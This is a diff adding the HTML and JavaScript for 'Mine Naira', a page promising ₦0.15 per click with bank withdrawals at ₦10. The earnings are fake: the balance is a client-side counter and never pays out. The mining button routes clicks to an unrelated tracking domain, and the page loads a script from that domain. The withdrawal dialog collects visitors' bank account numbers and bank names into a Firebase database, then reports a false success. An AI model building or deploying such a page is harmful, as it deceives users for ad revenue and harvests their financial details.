@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <meta name="author" content="Mine Naira Team">
+    <meta name="description" content="Mine Naira is the best platform to earn money by mining ₦0.15 per click. Withdraw directly to your bank when you hit ₦10. Start mining today and enjoy seamless earnings!">
+    <meta name="keywords" content="Mine Naira, Naira Mining, BTC Mining, Earn Money Online, Click to Earn, Withdraw Naira, Mining Platform, Easy Earnings, Online Income">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#4B0082">
+
+    <!-- Title -->
+    <title>Mine Naira - Earn ₦0.15 Per Click</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://app.angryminer.fun/static/image/standard.25d09622.gif" type="image/gif">
+
+    <!-- Open Graph Meta Tags for Social Media -->
+    <meta property="og:title" content="Mine Naira - Earn ₦0.15 Per Click">
+    <meta property="og:description" content="Start earning today with Mine Naira. Get ₦0.15 for every click and withdraw once you hit ₦10. Simple and fun mining experience!">
+    <meta property="og:image" content="https://app.angryminer.fun/static/image/standard.25d09622.gif">
+    <meta property="og:url" content="https://yoursite.com">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Mine Naira - Earn ₦0.15 Per Click">
+    <meta name="twitter:description" content="Start mining Naira now and earn ₦0.15 per click. Withdraw directly to your bank when you reach ₦10. Join now!">
+    <meta name="twitter:image" content="https://app.angryminer.fun/static/image/standard.25d09622.gif">
+    <title>Mine Naira</title>
+    <style>
+      /* General Reset */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background-color: #121212;
+    color: white;
+    text-align: center;
+    overflow: hidden;
+}
+
+/* Curved Navbar */
+.navbar {
+    width: 100%;
+    height: 120px;
+    background: linear-gradient(135deg, #6a11cb, #2575fc);
+    border-bottom-left-radius: 50px;
+    border-bottom-right-radius: 50px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.navbar h1 {
+    font-size: 28px;
+    color: #fff;
+    font-weight: bold;
+}
+
+/* Username Styling */
+.username-container {
+    margin: 20px;
+    font-size: 20px;
+    color: #ddd;
+}
+
+/* Centered GIF */
+.gif-container img {
+    width: 200px;
+    margin: 30px auto;
+}
+
+/* Balance Display */
+.balance-container {
+    font-size: 24px;
+    margin: 20px;
+    color: limegreen;
+}
+
+/* Buttons */
+.mine-btn, .withdraw-btn {
+    margin: 10px;
+    padding: 15px 30px;
+    border: none;
+    border-radius: 30px;
+    font-size: 18px;
+    cursor: pointer;
+    color: #fff;
+    background: linear-gradient(to right, #6a11cb, #2575fc);
+    transition: transform 0.2s ease;
+}
+
+.mine-btn:active, .withdraw-btn:active {
+    transform: scale(0.95);
+}
+
+.withdraw-btn:disabled {
+    background: gray;
+    cursor: not-allowed;
+}
+
+/* Withdraw Dialog */
+.dialog {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+}
+
+.dialog-content {
+    background: #333;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+}
+
+.dialog-content h3 {
+    margin-bottom: 10px;
+}
+
+.dialog-content input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 5px;
+}
+    </style>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.14.0/firebase-database-compat.js"></script>
+</head>
+<body>
+    <!-- Top Curved Navigation Bar -->
+    <div class="navbar">
+        <h1>Mine Naira</h1>
+    </div>
+
+    <!-- Username Display -->
+    <div class="username-container">
+        <p id="username">Loading...</p>
+    </div>
+
+    <!-- Centered GIF -->
+    <div class="gif-container">
+        <img src="https://app.angryminer.fun/static/image/standard.25d09622.gif" alt="Mining Animation">
+    </div>
+
+    <!-- Balance Display -->
+    <div class="balance-container">
+        <h2>Balance: ₦<span id="balance">0.00</span></h2>
+    </div>
+
+    <!-- Mining Button -->
+    <a href="https://slushhelmetmirth.com/ticqzd38?key=ac7e9a9ae5c78ea398c0ed496e49a3e5">
+    <button id="mineBtn" class="mine-btn">
+        Start Mining
+    </button>
+</a>
+    <!-- Withdraw Button -->
+    <button id="withdrawBtn" class="withdraw-btn" disabled>
+        Withdraw
+    </button>
+
+    <!-- Dialog for Withdraw -->
+    <div id="withdrawDialog" class="dialog">
+        <div class="dialog-content">
+            <h3>Withdraw Funds</h3>
+            <input type="text" id="accountNumber" placeholder="Account Number">
+            <input type="text" id="bankName" placeholder="Bank Name">
+            <button id="proceedBtn">Proceed</button>
+            <button id="closeDialog">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+      // Firebase Configuration
+const firebaseConfig = {
+    apiKey: "AIzaSyDJP2XIR51qGTLINiKvEoscYTMt11CaZ5s",
+    authDomain: "paytrust-71e30.firebaseapp.com",
+    databaseURL: "https://paytrust-71e30-default-rtdb.firebaseio.com/",
+    projectId: "paytrust-71e30",
+    storageBucket: "gs://paytrust-71e30.appspot.com",
+    messagingSenderId: "492609516838",
+    appId: "1:492609516838:android:5a924ad3b7e8e508fa3de7"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+// Get User Platform (Username)
+const username = navigator.platform || "User";
+document.getElementById("username").innerText = `Welcome, ${username}`;
+
+// Balance Variable and DOM Elements
+let balance = 0;
+const balanceDisplay = document.getElementById("balance");
+const withdrawBtn = document.getElementById("withdrawBtn");
+const mineBtn = document.getElementById("mineBtn");
+const dialog = document.getElementById("withdrawDialog");
+
+// Function to Save Balance to Firebase
+function saveBalance() {
+    database.ref(`users/${username}/balance`).set(balance);
+}
+
+// Retrieve Balance from Firebase When the Page Loads
+function retrieveBalance() {
+    database.ref(`users/${username}/balance`).once("value", (snapshot) => {
+        if (snapshot.exists()) {
+            balance = snapshot.val();
+            balanceDisplay.innerText = balance.toFixed(2);
+
+            // Enable withdraw button if balance is >= 10
+            if (balance >= 10) {
+                withdrawBtn.disabled = false;
+            }
+        } else {
+            balance = 0; // If no data, set balance to 0
+        }
+    });
+}
+
+// Mining Logic
+mineBtn.addEventListener("click", () => {
+    balance += 0.15;
+
+    // Animate Balance like Matrix Effect
+    let animatedBalance = balance.toFixed(2).split("");
+    let i = 0;
+    balanceDisplay.innerText = "0.00";
+    const interval = setInterval(() => {
+        balanceDisplay.innerText += animatedBalance[i];
+        i++;
+        if (i >= animatedBalance.length) clearInterval(interval);
+    }, 50);
+
+    // Save the updated balance to Firebase
+    saveBalance();
+
+    // Enable Withdraw Button if Balance >= 10
+    if (balance >= 10) {
+        withdrawBtn.disabled = false;
+    }
+});
+
+// Withdraw Functionality
+withdrawBtn.addEventListener("click", () => {
+    dialog.style.display = "flex";
+});
+
+// Dialog Close
+document.getElementById("closeDialog").addEventListener("click", () => {
+    dialog.style.display = "none";
+});
+
+// Proceed Withdraw
+document.getElementById("proceedBtn").addEventListener("click", () => {
+    const accountNumber = document.getElementById("accountNumber").value;
+    const bankName = document.getElementById("bankName").value;
+
+    if (accountNumber && bankName) {
+        // Save Withdrawal Info to Firebase
+        database.ref(`users/${username}/withdrawals`).push({
+            accountNumber: accountNumber,
+            bankName: bankName,
+            amount: balance.toFixed(2),
+            date: new Date().toLocaleString()
+        });
+
+        alert("Withdrawal request sent successfully!");
+
+        // Reset Balance and Save to Firebase
+        balance = 0;
+        balanceDisplay.innerText = "0.00";
+        saveBalance();
+        withdrawBtn.disabled = true;
+
+        dialog.style.display = "none";
+    } else {
+        alert("Please fill in all details.");
+    }
+});
+
+// Retrieve Balance on Page Load
+window.onload = retrieveBalance;
+    </script>
+    
+    <script type='text/javascript' src='//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js'></script>
+    
+</body>
+</html>
